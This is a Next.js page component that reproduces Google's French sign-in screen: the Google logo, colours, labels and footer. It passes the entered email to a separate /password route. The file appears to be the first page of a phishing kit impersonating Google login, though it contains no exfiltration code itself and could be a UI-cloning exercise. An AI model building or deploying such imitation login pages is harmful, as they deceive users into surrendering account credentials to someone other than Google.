"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";

export default function Home() {
  const [email, setEmail] = useState("");
  const router = useRouter();

  function handleNext() {
    if (!email.trim()) return;
    router.push(`/password?email=${encodeURIComponent(email.trim())}`);
  }

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-center px-5 py-8"
      style={{ backgroundColor: "#202124" }}
    >
      {/* Card */}
      <div
        className="w-full flex gap-20 items-start rounded-[28px] p-12 max-sm:flex-col max-sm:gap-8 max-sm:p-8"
        style={{ backgroundColor: "#2d2e30", maxWidth: "860px" }}
      >
        {/* ── LEFT ── */}
        <div className="flex-none flex flex-col gap-3 pt-1 max-sm:w-full" style={{ maxWidth: "240px" }}>
          {/* Google logo */}
          <div className="flex items-center mb-2">
            <GoogleIcon />
          </div>
          <h1
            className="text-[32px] font-normal leading-tight"
            style={{ fontFamily: "'Google Sans', Arial, sans-serif", color: "#e8eaed" }}
          >
            Connexion
          </h1>
          <p className="text-base leading-relaxed" style={{ color: "#9aa0a6" }}>
            Utilisez votre compte Google
          </p>
        </div>

        {/* ── RIGHT ── */}
        <div className="flex-1 flex flex-col gap-5">
          {/* Email input */}
          <div className="relative w-full">
            <input
              type="text"
              placeholder="Adresse e-mail ou téléphone"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              autoFocus
              className="w-full bg-transparent rounded-sm text-base outline-none transition-all duration-200 px-[14px] py-4"
              style={{
                fontFamily: "'Roboto', Arial, sans-serif",
                border: "1px solid #5f6368",
                color: "#e8eaed",
                caretColor: "#8ab4f8",
              }}
              onFocus={(e) => {
                e.currentTarget.style.border = "1px solid #8ab4f8";
                e.currentTarget.style.boxShadow = "inset 0 0 0 1px #8ab4f8";
              }}
              onBlur={(e) => {
                e.currentTarget.style.border = "1px solid #5f6368";
                e.currentTarget.style.boxShadow = "none";
              }}
            />
          </div>

          {/* Forgot email */}
          <a
            href="#"
            className="text-sm font-medium w-fit hover:underline"
            style={{ fontFamily: "'Google Sans', Arial, sans-serif", color: "#8ab4f8" }}
          >
            Adresse e-mail oubliée ?
          </a>

          {/* Guest note */}
          <p className="text-[13.5px] leading-relaxed" style={{ color: "#9aa0a6" }}>
            Ce n&apos;est pas votre ordinateur ? Utilisez le mode Invité pour vous
            connecter en mode privé.{" "}
            <a href="#" className="font-medium hover:underline" style={{ color: "#8ab4f8" }}>
              En savoir plus sur l&apos;utilisation du mode Invité
            </a>
          </p>

          {/* Actions */}
          <div className="flex items-center justify-end gap-6 mt-2">
            <a
              href="#"
              className="text-sm font-medium whitespace-nowrap hover:underline"
              style={{ fontFamily: "'Google Sans', Arial, sans-serif", color: "#8ab4f8" }}
            >
              Créer un compte
            </a>
            <button
              className="border-none rounded-3xl text-sm font-medium cursor-pointer whitespace-nowrap px-7 py-[10px] transition-all duration-200"
              style={{
                fontFamily: "'Google Sans', Arial, sans-serif",
                backgroundColor: "#8ab4f8",
                color: "#202124",
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.backgroundColor = "#aecbfa";
                e.currentTarget.style.boxShadow = "0 1px 3px rgba(0,0,0,0.3)";
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.backgroundColor = "#8ab4f8";
                e.currentTarget.style.boxShadow = "none";
              }}
              onMouseDown={(e) => {
                e.currentTarget.style.backgroundColor = "#7baaf7";
              }}
              onMouseUp={(e) => {
                e.currentTarget.style.backgroundColor = "#aecbfa";
              }}
              onClick={handleNext}
            >
              Suivant
            </button>
          </div>
        </div>
      </div>

      {/* ── FOOTER ── */}
      <footer
        className="flex items-center justify-between w-full pt-4 px-1 max-sm:flex-col max-sm:gap-4 max-sm:items-start"
        style={{ maxWidth: "860px" }}
      >
        <div>
          <select
            defaultValue="fr"
            className="cursor-pointer outline-none rounded-sm text-[13px] py-[6px] pl-3 pr-8 transition-colors duration-150"
            style={{
              appearance: "none",
              WebkitAppearance: "none",
              background:
                "transparent url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6'%3E%3Cpath d='M0 0l5 6 5-6z' fill='%239aa0a6'/%3E%3C/svg%3E\") no-repeat right 10px center",
              border: "1px solid #5f6368",
              color: "#9aa0a6",
              fontFamily: "'Roboto', Arial, sans-serif",
            }}
            onMouseEnter={(e) => {
              e.currentTarget.style.borderColor = "#8ab4f8";
              e.currentTarget.style.color = "#e8eaed";
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.borderColor = "#5f6368";
              e.currentTarget.style.color = "#9aa0a6";
            }}
          >
            <option value="fr">Français (France)</option>
            <option value="en">English (United States)</option>
            <option value="mg">Malagasy</option>
          </select>
        </div>

        <div className="flex gap-6">
          {["Aide", "Confidentialité", "Conditions"].map((label) => (
            <a
              key={label}
              href="#"
              className="text-[13px] hover:underline transition-colors duration-150"
              style={{
                fontFamily: "'Roboto', Arial, sans-serif",
                color: "#9aa0a6",
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.color = "#e8eaed";
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.color = "#9aa0a6";
              }}
            >
              {label}
            </a>
          ))}
        </div>
      </footer>
    </div>
  );
}

function GoogleIcon() {
  return (
    <svg
      xmlns="http://www.w3.org/2000/svg"
      viewBox="0 0 48 48"
      width="40"
      height="40"
      aria-label="Google"
      role="img"
    >
      <path
        fill="#EA4335"
        d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"
      />
      <path
        fill="#4285F4"
        d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"
      />
      <path
        fill="#FBBC05"
        d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"
      />
      <path
        fill="#34A853"
        d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"
      />
      <path fill="none" d="M0 0h48v48H0z" />
    </svg>
  );
}
